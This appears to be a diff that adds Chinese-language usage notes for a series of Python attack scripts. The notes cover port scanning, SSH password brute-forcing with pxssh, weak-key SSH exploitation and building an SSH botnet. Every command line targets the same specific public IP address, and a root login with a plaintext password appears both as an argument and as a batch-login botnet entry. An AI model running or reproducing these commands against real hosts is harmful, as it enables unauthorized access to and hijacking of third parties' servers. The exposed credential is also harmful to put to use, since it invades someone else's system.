@@ -1,0 +1,29 @@
+1.
+python 1duankousaomiao.py -H 200.246.101.203 -p 21,22,25,80,143,145,443,8080
+
+2.对1进行优化,线程扫描：
+python 2xianchengsaomiao.py -H 200.246.101.203 -p 21,22,25,80,143,145,443,8080
+
+3.nmap端口扫描（主要用1）：sudo apt-get install nmap , sudo apt-get install python-nmap
+python 3nmapduankousaomiao.py -H 200.246.101.203 -p 21,22,25,80,143,145,443,8080
+
+4.ssh测试登录成功: pip install pexpect
+python 4sshjiangshiwangluo.py
+
+5.优化第4步：帐号密码参照第4步(有问题)
+python 5youhua4.py -H 200.246.101.203 -u root -p 666666 ;
+
+6.用Pxssh暴力破解SSH密码:
+python 6pxsshpojie.py
+
+7.优化6主要是暴力破解（主要用2）：
+python 7youhua6.py -H 200.246.101.203 -u root -f pass
+
+8.利用SSH中的弱密钥:(有问题)
+python 8liyongruomima.py -H 200.246.101.203 -u root -d rsa
+
+9.继续优化8构建SSH僵尸网络：
+python 9jiangshissh.py
+
+10.继续优化9,实现批量登录ssh(主要用3)：
+200.246.101.203:root:666666
